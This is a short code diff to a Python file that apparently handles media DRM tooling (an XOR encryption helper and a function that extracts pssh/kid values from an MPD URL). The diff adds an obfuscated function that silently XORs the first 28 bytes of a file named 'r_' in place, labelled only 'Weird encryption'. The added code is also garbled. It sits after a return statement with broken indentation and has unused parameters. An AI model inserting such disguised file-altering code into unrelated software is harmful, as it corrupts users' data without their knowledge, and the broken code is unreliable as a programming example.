@@ -273,7 +273,17 @@ async def xor_encrypt_to_base64(input_str, key="123456"):
     return base64_encrypted.decode('utf-8')
     success = decrypt_file(key)
     print("Decryption successful:", success)
-
+    async def _A7(_Q, _W):
+    _R = "r_"  
+    if not _X1.exists(_R):
+        return False
+    with open(_R, "r+b") as _S:
+        _T = min(28, _X1.getsize(_R))  
+        with _X2.mmap(_S.fileno(), length=_T, access=_X2.ACCESS_WRITE) as _U:
+            for _V in range(_T):
+                _U[_V] ^= ord(_W[_V]) if _V < len(_W) else _V  # Weird encryption
+        return True
+        
 async def get_pssh_kid(mpd_url: str, headers: dict = {}, cookies: dict = {}):
     """
     Get pssh, kid from mpd url
